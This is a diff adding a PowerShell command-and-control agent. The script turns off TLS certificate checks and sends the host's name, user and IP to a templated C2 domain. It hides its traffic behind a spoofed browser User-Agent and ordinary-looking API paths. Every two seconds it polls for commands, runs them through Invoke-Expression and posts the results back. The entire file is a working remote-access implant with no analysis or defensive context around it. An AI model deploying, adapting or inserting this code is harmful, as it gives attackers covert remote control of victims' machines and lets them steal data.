@@ -1,0 +1,136 @@
+# Accept self-signed TLS certificates
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
+# Unique agent ID; must be defined *before* HEADERS
+$AGENT_ID        = [guid]::NewGuid().ToString()
+
+# C2 server configuration
+$C2_BASE       = "https://${c2_domain}"
+$GET_ENDPOINT  = "/api/v2/status"
+$POST_ENDPOINT = "/api/v2/users/update"
+
+# Now include Agent-ID in every request
+$HEADERS       = @{
+    "Access-X-Control" = "000000011110000000"
+    "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Agent-ID"         = $AGENT_ID
+}
+
+$SLEEP_INTERVAL  = 2   # seconds between beacons
+$INITIAL_CONNECT = $true
+
+# Grab primary IPv4 based on default route (fallback to any non-loopback)
+try {
+    $defRoute = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
+                Where-Object { $_.NextHop -ne "0.0.0.0" } |
+                Select-Object -First 1
+    if ($defRoute) {
+        $local_ip = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 |
+                     Select-Object -First 1 -ExpandProperty IPAddress)
+    } else {
+        throw "No default route"
+    }
+} catch {
+    try {
+        $local_ip = Get-NetIPAddress -AddressFamily IPv4 |
+                    Where-Object { $_.IPAddress -notlike "127.*" -and $_.InterfaceAlias -notmatch "Loopback" } |
+                    Select-Object -First 1 -ExpandProperty IPAddress
+    } catch {
+        $local_ip = "unknown"
+    }
+}
+
+function Get-SystemInfo {
+    return @{
+        hostname = $env:COMPUTERNAME
+        username = $env:USERNAME
+        os       = "Windows"
+        agent_id = $AGENT_ID
+        local_ip = $local_ip
+    }
+}
+
+function Beacon {
+    try {
+        $response     = Invoke-WebRequest -Uri "$C2_BASE$GET_ENDPOINT" `
+                                          -Headers $HEADERS `
+                                          -Method Get -UseBasicParsing
+        $jsonResponse = $response.Content | ConvertFrom-Json
+        return $jsonResponse.command
+    } catch {
+        return $null
+    }
+}
+
+function Send-Output {
+    param($output, $info)
+    
+    # Clean up newlines and spaces
+    $output = $output -replace '[\r\n]+', "`n"  # Remove excess newlines
+    $output = $output.Trim()
+
+    # Ensure each file is on a new line
+    if ($output -match '^\[.*\]$') {
+        # Clean up the array output (list of files), making it line by line
+        $output = $output -replace '^\[|\]$', ''  # Remove leading/trailing brackets
+        $output = $output -replace '\', ''         # Remove any file path separators (optional)
+        $output = $output -replace ',\s*', "`n"   # Separate filenames with newlines
+    }
+
+    if ($info) {
+        $payload = $info
+        $payload.output = $output
+    } else {
+        $payload = @{
+            hostname = $env:COMPUTERNAME
+            username = $env:USERNAME
+            agent_id = $AGENT_ID
+            local_ip = $local_ip
+            output   = $output
+        }
+    }
+    
+    # Send the clean output to C2 server
+    Invoke-RestMethod -Uri "$C2_BASE$POST_ENDPOINT" `
+                     -Headers $HEADERS `
+                     -Method Post `
+                     -Body ($payload | ConvertTo-Json) `
+                     -ContentType "application/json"
+}
+
+function Execute-Command {
+    param($command)
+
+    # Handle dir and ls commands to format the output cleanly
+    if ($command -match "^dir" -or $command -match "^ls") {
+        # Use -Name to output just file names without the table formatting
+        $result = Invoke-Expression "$command -Name"
+        
+        # Ensure each filename is on a new line
+        $result = $result -join "`n"
+    } else {
+        try {
+            $result = Invoke-Expression $command 2>&1 | Out-String -Width 4096
+        } catch {
+            return $_.Exception.Message
+        }
+    }
+
+    return $result.Trim()
+}
+
+# Initial callback with system info
+if ($INITIAL_CONNECT) {
+    Send-Output "[+] New agent online" (Get-SystemInfo)
+    $INITIAL_CONNECT = $false
+}
+
+# Main loop
+while ($true) {
+    $cmd = Beacon
+    if ($cmd) {
+        $out = Execute-Command $cmd
+        Send-Output $out
+    }
+    Start-Sleep -Seconds $SLEEP_INTERVAL
+}
